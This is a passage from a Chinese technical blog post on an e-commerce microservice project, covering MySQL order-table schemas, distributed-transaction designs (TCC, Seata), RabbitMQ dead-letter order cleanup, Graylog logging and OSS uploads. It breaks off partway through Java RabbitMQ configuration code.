class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;发货时间&#x27;</span>,</span><br><span class="line">  `end_time` <span class="type">timestamp</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;交易完成时间&#x27;</span>,</span><br><span class="line">  `close_time` <span class="type">timestamp</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;交易关闭时间&#x27;</span>,</span><br><span class="line">  `comment_time` <span class="type">timestamp</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;评价时间&#x27;</span>,</span><br><span class="line">  `update_time` <span class="type">timestamp</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;更新时间&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`order_id`),</span><br><span class="line">  KEY `multi_key_status_time` (`status`,`create_time`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 <span class="keyword">COLLATE</span><span class="operator">=</span>utf8_bin;</span><br></pre></td></tr></table></figure>



<p>物流信息表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE `tb_order_logistics` (</span><br><span class="line">  `order_id` bigint(20) NOT NULL COMMENT &#x27;订单id，与订单表一对一&#x27;,</span><br><span class="line">  `logistics_number` varchar(18) DEFAULT &#x27;&#x27; COMMENT &#x27;物流单号&#x27;,</span><br><span class="line">  `logistics_company` varchar(18) DEFAULT &#x27;&#x27; COMMENT &#x27;物流公司名称&#x27;,</span><br><span class="line">  `addressee` varchar(32) NOT NULL COMMENT &#x27;收件人&#x27;,</span><br><span class="line">  `phone` varchar(11) NOT NULL COMMENT &#x27;收件人手机号码&#x27;,</span><br><span class="line">  `province` varchar(16) NOT NULL COMMENT &#x27;省&#x27;,</span><br><span class="line">  `city` varchar(32) NOT NULL COMMENT &#x27;市&#x27;,</span><br><span class="line">  `district` varchar(32) NOT NULL COMMENT &#x27;区&#x27;,</span><br><span class="line">  `street` varchar(256) NOT NULL COMMENT &#x27;街道&#x27;,</span><br><span class="line">  `postcode` int(6) DEFAULT &#x27;0&#x27; COMMENT &#x27;邮编&#x27;,</span><br><span class="line">  `create_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT &#x27;创建时间&#x27;,</span><br><span class="line">  `update_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT &#x27;更新时间&#x27;,</span><br><span class="line">  PRIMARY KEY (`order_id`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure>



<p>订单条目：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `tb_order_detail` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;主键&#x27;</span>,</span><br><span class="line">  `order_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;订单id&#x27;</span>,</span><br><span class="line">  `sku_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;sku商品id&#x27;</span>,</span><br><span class="line">  `num` <span class="type">int</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;购买数量&#x27;</span>,</span><br><span class="line">  `title` <span class="type">varchar</span>(<span class="number">256</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;商品标题&#x27;</span>,</span><br><span class="line">  `spec` <span class="type">varchar</span>(<span class="number">1024</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;商品动态属性键值集&#x27;</span>,</span><br><span class="line">  `price` <span class="type">int</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;价格,单位：分&#x27;</span>,</span><br><span class="line">  `image` <span class="type">varchar</span>(<span class="number">256</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;商品图片&#x27;</span>,</span><br><span class="line">  `create_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">  `update_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;更新时间&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`) <span class="keyword">USING</span> BTREE,</span><br><span class="line">  KEY `key_order_id` (`order_id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 COMMENT<span class="operator">=</span><span class="string">&#x27;订单详情表&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="分布式事务"><a href="#分布式事务" class="headerlink" title="分布式事务"></a>分布式事务</h4><h5 id="跨数据源"><a href="#跨数据源" class="headerlink" title="跨数据源"></a>跨数据源</h5><p>随着业务数据规模的快速发展，数据量越来越大，单库单表逐渐成为瓶颈。所以我们对数据库进行了水平拆分，将原单库单表拆分成数据库分片，于是就产生了跨数据库事务问题。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120490.png" alt="image-20210704030852255"></p>
<h5 id="跨服务"><a href="#跨服务" class="headerlink" title="跨服务"></a>跨服务</h5><p>在业务发展初期，“一块大饼”的单业务系统架构，能满足基本的业务需求。但是随着业务的快速发展，系统的访问量和业务复杂程度都在快速增长，单系统架构逐渐成为业务发展瓶颈，解决业务系统的高耦合、可伸缩问题的需求越来越强烈。</p>
<p>如下图所示，按照面向服务（SOA）的架构的设计原则，将单业务系统拆分成多个业务系统，降低了各系统之间的耦合度，使不同的业务系统专注于自身业务，更有利于业务的发展和系统容量的伸缩。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120491.png" alt="image-20210704030946480"></p>
<h5 id="分布式系统数据一致性问题"><a href="#分布式系统数据一致性问题" class="headerlink" title="分布式系统数据一致性问题"></a>分布式系统数据一致性问题</h5><p>在数据库水平拆分、服务垂直拆分之后，一个业务操作通常要跨多个数据库、服务才能完成。在分布式网络环境下，我们无法保障所有服务、数据库都百分百可用，一定会出现部分服务、数据库执行成功，另一部分执行失败的问题。</p>
<p>当出现部分业务操作成功、部分业务操作失败时，业务数据就会出现不一致。</p>
<p>下单付款：</p>
<ul>
<li>创建新订单</li>
<li>扣减商品库存</li>
<li>从用户账户余额扣除金额</li>
</ul>
<p>完成上面的操作需要访问三个不同的微服务和三个不同的数据库。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120492.png" alt="image-20210704031058760"></p>
<h5 id="设计方案一：TCC"><a href="#设计方案一：TCC" class="headerlink" title="设计方案一：TCC"></a>设计方案一：TCC</h5><p>执行分两个阶段：</p>
<ul>
<li>准备阶段（try）：资源的检测和预留；</li>
<li>执行阶段（confirm&#x2F;cancel）：根据上一步结果，判断下面的执行方法。如果上一步中所有事务参与者都成功，则这里执行confirm。反之，执行cancel</li>
</ul>
<p>流程图如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120493.png" alt="image-20210704031150404"></p>
<ul>
<li><p>优势</p>
<p>TCC执行的每一个阶段都会提交本地事务并释放锁，并不需要等待其它事务的执行结果。而如果其它事务执行失败，最后不是回滚，而是执行补偿操作。这样就避免了资源的长期锁定和阻塞等待，执行效率比较高，属于性能最好的分布式事务方式。</p>
</li>
<li><p>缺点</p>
<ul>
<li>代码侵入：需要人为编写代码实现，代码侵入较多</li>
<li>开发成本高：一个业务需要拆分成3个步骤，分别编写业务实现，业务编写比较复杂</li>
<li>安全性考虑：cancel动作如果执行失败，资源就无法释放，需要引入重试机制，而重试可能导致重复执行，还要考虑重试时的幂等问题</li>
</ul>
</li>
</ul>
<h6 id="设计方案二：消息服务"><a href="#设计方案二：消息服务" class="headerlink" title="设计方案二：消息服务"></a>设计方案二：消息服务</h6><p>一般分为事务的发起者A和事务的其它参与者B：</p>
<ul>
<li>事务发起者A执行本地事务</li>
<li>事务发起者A通过MQ将需要执行的事务信息发送给事务参与者B</li>
<li>事务参与者B接收到消息后执行本地事务</li>
</ul>
<p>流程图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120494.png" alt="image-20210704031324120"></p>
<h6 id="设计方案三：独立消息服务"><a href="#设计方案三：独立消息服务" class="headerlink" title="设计方案三：独立消息服务"></a>设计方案三：独立消息服务</h6><p>流程图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120495.png" alt="image-20210704031432367"></p>
<p>时序图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120496.png" alt="image-20210704031531841"></p>
<p>事务发起者A的基本执行步骤：</p>
<ul>
<li>开启本地事务</li>
<li>通知消息服务，准备发送消息（消息服务将消息持久化，标记为准备发送）</li>
<li>执行本地业务，<ul>
<li>执行失败则终止，通知消息服务，取消发送（消息服务修改订单状态）</li>
<li>执行成功则继续，通知消息服务，确认发送（消息服务发送消息、修改订单状态）</li>
</ul>
</li>
<li>提交本地事务</li>
</ul>
<p>消息服务本身提供下面的接口：</p>
<ul>
<li>准备发送：把消息持久化到数据库，并标记状态为准备发送</li>
<li>取消发送：把数据库消息状态修改为取消</li>
<li>确认发送：把数据库消息状态修改为确认发送。尝试发送消息，成功后修改状态为已发送</li>
<li>确认消费：消费者已经接收并处理消息，把数据库消息状态修改为已消费</li>
<li>定时任务：定时扫描数据库中状态为确认发送的消息，然后询问对应的事务发起者，事务业务执行是否成功，结果：<ul>
<li>业务执行成功：尝试发送消息，成功后修改状态为已发送</li>
<li>业务执行失败：把数据库消息状态修改为取消</li>
</ul>
</li>
</ul>
<p>事务参与者B的基本步骤：</p>
<ul>
<li>接收消息</li>
<li>开启本地事务</li>
<li>执行业务</li>
<li>通知消息服务，消息已经接收和处理</li>
<li>提交事务</li>
</ul>
<p><strong>优点：</strong></p>
<ul>
<li>解除了事务业务与消息相关业务的耦合</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>实现起来比较复杂</li>
</ul>
<h6 id="设计方案三：Seata"><a href="#设计方案三：Seata" class="headerlink" title="设计方案三：Seata"></a>设计方案三：Seata</h6><p>一个用户购买商品的业务逻辑。整个业务逻辑由3个微服务提供支持：</p>
<ul>
<li>仓储服务：对给定的商品扣除仓储数量。</li>
<li>订单服务：根据采购需求创建订单。</li>
<li>帐户服务：从用户帐户中扣除余额。</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120497.png" alt="image-20210704031726133"></p>
<h5 id="微信支付"><a href="#微信支付" class="headerlink" title="微信支付"></a>微信支付</h5><ul>
<li>商户生成订单</li>
<li>商户调用微信下单接口，获取预交易的链接</li>
<li>商户将链接生成二维码图片，展示给用户；</li>
<li>支付结果通知：<ul>
<li>微信异步通知商户支付结果，商户告知微信支付接收情况</li>
<li>商户如果没有收到通知，可以调用接口，查询支付状态</li>
</ul>
</li>
<li>如果支付成功，发货，修改订单状态</li>
</ul>
<p>流程图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120498.png" alt="image-20210704032529120"></p>
<h5 id="订单清理"><a href="#订单清理" class="headerlink" title="订单清理"></a>订单清理</h5><p>使用死信交换机（Dead Letter Exchange）来清理。</p>
<p>死信交换机流程图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120499.png" alt="image-20210704033149542">、</p>
<p>在声明的时候，通过<code>x-dead-letter-exchange</code>属性指定一个交换机，被指定的交换机就是<strong>死信交换机（Dead Letter Exchange）</strong>。同时队列还可以指定一个<code>x-dead-letter-routing-key</code>（死信路由）作为死信的<code>routing_key</code>，死信交换机转发消息时会根据这个<code>routing_key</code>来转发消息。</p>
<p>死信交换机接收到消息以后，会根据消息的<code>routing_key</code>再次转发消息到绑定的队列，如果队列绑定到死信交换机时，会根据队列指定的<code>x-dead-letter-routing-key</code>来转发，如果队列没有绑定，则会根据消息来源时指定的<code>routing_key</code>来转发。</p>
<p>例如：现在publisher发送消息时指定<code>routing_key</code>为<code>foo</code>，队列绑定死信交换机时指定了<strong>死信路由</strong>为：<code>bar</code>，则死信交换机转发时，会使用<code>bar</code>作为<code>routing_key</code>，如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120500.png" alt="image-20210704033509109"></p>
<h3 id="基础服务"><a href="#基础服务" class="headerlink" title="基础服务"></a>基础服务</h3><h4 id="短信微服务"><a href="#短信微服务" class="headerlink" title="短信微服务"></a>短信微服务</h4><p>负责从RabbitMQ中取发短信任务，然后执行发短信服务。</p>
<h4 id="权限微服务"><a href="#权限微服务" class="headerlink" title="权限微服务"></a>权限微服务</h4><p>负责权限认证，授权等</p>
<h4 id="日志服务"><a href="#日志服务" class="headerlink" title="日志服务"></a>日志服务</h4><p>在微服务架构下，微服务被拆分成多个微小的服务，每个微小的服务都部署在不同的服务器实例上，当我们定位问题，检索日志的时候需要依次登录每台服务器进行检索。这样是不是感觉很繁琐和效率低下。所以我们还需要一个工具来帮助集中收集、存储和搜索这些跟踪信息。集中化管理日志后，日志的统计和检索又成为一件比较麻烦的事情。以前，我们通过使用grep、awk和wc等Linux命令能实现检索和统计，但是对于要求更高的查询、排序和统计等要求和庞大的机器数量依然使用这样的方法难免有点力不从心。</p>
<p>分布式日志服务选择graylog4.1，相比于ELK的解决方案，graylog有自己的优势。</p>
<p>ELK解决方案的问题：</p>
<ol>
<li>不能处理多行日志，比如Mysql慢查询，Tomcat&#x2F;Jetty应用的Java异常打印</li>
<li>不能保留原始日志，只能把原始日志分字段保存，这样搜索日志结果是一堆Json格式文本，无法阅读。</li>
<li>不符合正则表达式匹配的日志行，被全部丢弃。</li>
</ol>
<p>GrayLog方案的优势：</p>
<ol>
<li>一体化方案，安装方便，不像ELK有3个独立系统间的集成问题。</li>
<li>采集原始日志，并可以事后再添加字段，比如http_status_code，response_time等等。</li>
<li>自己开发采集日志的脚本，并用curl&#x2F;nc发送到Graylog Server，发送格式是自定义的GELF，Flunted和Logstash都有相应的输出GELF消息的插件。自己开发带来很大的自由度。实际上只需要用inotifywait监控日志的modify事件，并把日志的新增行用curl&#x2F;netcat发送到Graylog Server就可。</li>
<li>搜索结果高亮显示，就像google一样。</li>
<li>搜索语法简单，比如： source:mongo AND reponse_time_ms:&gt;5000，避免直接输入elasticsearch搜索json语法</li>
<li>搜索条件可以导出为elasticsearch的搜索json文本，方便直接开发调用elasticsearch rest api的搜索脚本。</li>
</ol>
<h4 id="阿里云OSS服务"><a href="#阿里云OSS服务" class="headerlink" title="阿里云OSS服务"></a>阿里云OSS服务</h4><p>上传图片至oss可选的设计方案有三种，如下：</p>
<p>传统方式：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120501.png" alt="image-20210703151536054"></p>
<p>web前端签名直传：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120502.png" alt="image-20210703151623594"></p>
<p>服务端签名后直传流程图：</p>
<ul>
<li>用户发送上传请求到应用服务器</li>
<li>应用服务器返回上传policy和签名给用户</li>
<li>用户直接上传数据到OSS</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120503.png" alt="image-20210703151703004"></p>
<h3 id="数据层"><a href="#数据层" class="headerlink" title="数据层"></a>数据层</h3><h4 id="MySQL-1"><a href="#MySQL-1" class="headerlink" title="MySQL"></a>MySQL</h4><p>可设计</p>
<p>tb_brand:品牌表</p>
<p>tb_category:分类表</p>
<p>tb_category_brand：品牌和分类中间表</p>
<p>tb_coupon：优惠卷</p>
<p>tb_order：订单表</p>
<p>tb_order_detail：订单细节表</p>
<p>tb_order_logistics：订单发货地址表</p>
<p>tb_pay_log：支付详情表</p>
<p>tb_promition_condition：优惠条件表</p>
<p>tb_promition：秒杀表</p>
<p>tb_sku：商品sku表</p>
<p>tb_spec_group：商品规格组表</p>
<p>tb_spec_param：商品参数表</p>
<p>tb_spu：Spu表</p>
<p>tb_spu_detail：spu详情表</p>
<p>tb_user：用户表</p>
<p>tb_user_coupon：用户优惠卷表</p>
<p>undo_log：seata的undo log表</p>
<h4 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h4><p>用于做搜索推荐</p>
<h4 id="Redis-1"><a href="#Redis-1" class="headerlink" title="Redis"></a>Redis</h4><p>存储短信验证码，用户token，商品SPU，SKU信息</p>
<h4 id="MongoDB-1"><a href="#MongoDB-1" class="headerlink" title="MongoDB"></a>MongoDB</h4><p>对于购物车数据，不是很重要并且数量很多，使用MySQL存储成本比较高，可以使用更廉价的MongoDB来存储。</p>
<h1 id="五、项目主要模块实现"><a href="#五、项目主要模块实现" class="headerlink" title="五、项目主要模块实现"></a>五、项目主要模块实现</h1><h2 id="项目准备工作"><a href="#项目准备工作" class="headerlink" title="项目准备工作"></a>项目准备工作</h2><h3 id="技术选择"><a href="#技术选择" class="headerlink" title="技术选择"></a>技术选择</h3><p>前端技术包括：</p>
<ul>
<li>基础的HTML、CSS、JavaScript（基于ES6标准）</li>
<li>JQuery</li>
<li>Vue.js 2.0</li>
<li>基于Vue的UI框架：Vuetify、类似于BootStrap、element-ui</li>
<li>前端构建工具：WebPack，项目编译、打包工具</li>
<li>前端安装包工具：NPM</li>
<li>Vue脚手架：Vue-cli</li>
<li>Vue路由：vue-router</li>
<li>ajax框架：axios</li>
<li>基于Vue的富文本框架：quill-editor</li>
</ul>
<p>服务端技术包括：</p>
<ul>
<li>基础的SpringMVC、Spring和MyBatis（MybatisPlus）</li>
<li>Spring Boot 2</li>
<li>Spring Cloud 技术栈</li>
<li>OpenResty（Nginx + Lua）</li>
<li>Redis、Jedis、Lua脚本</li>
<li>RabbitMQ</li>
<li>Elasticsearch</li>
<li>Nginx</li>
<li>MongoDB</li>
<li>Canal</li>
<li>JWT</li>
<li>GrayLog日志系统</li>
<li>Skywalking链路追踪</li>
<li>Seata分布式事务</li>
<li>阿里OSS、CMS等服务</li>
<li>微信支付</li>
</ul>
<h3 id="项目开发环境"><a href="#项目开发环境" class="headerlink" title="项目开发环境"></a>项目开发环境</h3><ul>
<li>IDE：使用IDEA 2020.3和WebStorm 2020.3</li>
<li>JDK：统一使用JDK1.8</li>
<li>项目构建：maven 3.2.x</li>
</ul>
<h3 id="项目测试环境"><a href="#项目测试环境" class="headerlink" title="项目测试环境"></a>项目测试环境</h3><ul>
<li><p>Windows 10 16G</p>
<p>运行Nignx 1.12、管理员页面，门户页面，10个微服务（jar包形式）</p>
</li>
<li><p>Mac：Centos 7.5 6G 本地虚拟机</p>
<p>已docker容器方式运行，mysql:5.7.25，elasticsearch 7.2，redis，mongo，mongo-express，canal&#x2F;canal-server，rabbitmq:3-management，kibana:7.4.2 ，</p>
</li>
<li><p>阿里云服务器ECS </p>
<p>已docker方式运行，mongo4.2，es7.10，graylog4</p>
</li>
<li><p>腾讯云服务器ECS </p>
<p>已docker方式运行mysql：5.7.25，redis，canal&#x2F;canal-server，mongo，mongo-express，运行skywalking 8，其中需要使用阿里云安装的es7.10</p>
</li>
<li><p>阿里云SMS服务</p>
</li>
<li><p>阿里云OSS存储服务</p>
</li>
</ul>
<h3 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h3><p>项目有许多微服务组成，而每个微服务的依赖及版本信息需要统一管理，因此需要有一个父工程。</p>
<p>而每个微服务本身有自己的业务，并且服务和服务间会有相互调用，需要将自身的实体类、Feign接口对外暴露出去，提供成jar包供别人加载，项目结构如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120505.png" alt="截屏2021-07-03 下午5.10.56"></p>
<h2 id="ElasticSearch数据同步问题解决方案"><a href="#ElasticSearch数据同步问题解决方案" class="headerlink" title="ElasticSearch数据同步问题解决方案"></a>ElasticSearch数据同步问题解决方案</h2><p>搜索功能依赖的商品数据是存储在ElasticSearch中的，但是数据库中也有一份商品数据。当我们对商品做增、删、改这样的操作时，ElasticSearch并未感知到，此时就会出现<strong>数据库数据与索引库数据的不一致</strong>。</p>
<p>在项目设计时使用消息队列来解决这个问题，但是具体实现还需考虑一下几个问题：</p>
<ul>
<li><p>什么时候发消息？</p>
<ul>
<li>当商品服务对商品进行上下架的时候，需要发送一条消息，通知其它服务</li>
</ul>
</li>
<li><p>商品微服务发送消息的内容是什么？</p>
<ul>
<li>对商品的增删改时其它服务可能需要新的商品数据，但是如果消息内容中包含全部商品信息，数据量太大，而且并不是每个服务都需要全部的信息。因此我们<strong>只发送商品id</strong>，其它服务可以根据id查询自己需要的信息。</li>
</ul>
</li>
<li><p>搜索微服务接收消息后如何处理？</p>
<ul>
<li>上架：添加新的数据到索引库</li>
<li>下架：删除索引库数据</li>
</ul>
</li>
</ul>
<p>编写消息队列常量：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.common.constants;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">BaseMQConstants</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ExchangeConstants</span> &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 商品服务交换机名称</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ITEM_EXCHANGE_NAME</span> <span class="operator">=</span> <span class="string">&quot;ly.item.exchange&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 消息服务交换机名称</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SMS_EXCHANGE_NAME</span> <span class="operator">=</span> <span class="string">&quot;ly.sms.exchange&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 订单业务的交换机</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ORDER_EXCHANGE_NAME</span> <span class="operator">=</span> <span class="string">&quot;ly.order.exchange&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 死信队列交换机名称</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEAD_EXCHANGE_NAME</span> <span class="operator">=</span> <span class="string">&quot;ly.dead.exchange&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">RoutingKeyConstants</span> &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 商品上架的routing-key</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ITEM_UP_KEY</span> <span class="operator">=</span> <span class="string">&quot;item.up&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 商品下架的routing-key</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ITEM_DOWN_KEY</span> <span class="operator">=</span> <span class="string">&quot;item.down&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 短信验证的routing-key</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">VERIFY_CODE_KEY</span> <span class="operator">=</span> <span class="string">&quot;sms.verify.code&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 清理订单routing-key</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EVICT_ORDER_KEY</span> <span class="operator">=</span> <span class="string">&quot;order.evict&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">QueueConstants</span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 搜索服务，商品上架的队列</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SEARCH_ITEM_UP</span> <span class="operator">=</span> <span class="string">&quot;search.item.up.queue&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 搜索服务，商品下架的队列</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SEARCH_ITEM_DOWN</span> <span class="operator">=</span> <span class="string">&quot;search.item.down.queue&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 搜索服务，商品下架的队列</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SMS_VERIFY_CODE_QUEUE</span> <span class="operator">=</span> <span class="string">&quot;sms.verify.code.queue&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 订单死信队列名称</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEAD_ORDER_QUEUE</span> <span class="operator">=</span> <span class="string">&quot;ly.dead.order.queue&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 订单清理队列名称</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EVICT_ORDER_QUEUE</span> <span class="operator">=</span> <span class="string">&quot;ly.evict.order.queue&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="商品微服务发送消息"><a href="#商品微服务发送消息" class="headerlink" title="商品微服务发送消息"></a>商品微服务发送消息</h3><p>Json消息转化器：</p>
<p>默认情况下，AMQP会使用JDK的序列化方式对发送的消息进行处理，传输数据比较大，效率太低，可读性差。这里自定义消息转换器，使用JSON来处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.item.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.support.converter.Jackson2JsonMessageConverter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-06-04 01:59</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RabbitConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Jackson2JsonMessageConverter <span class="title function_">messageConverter</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title 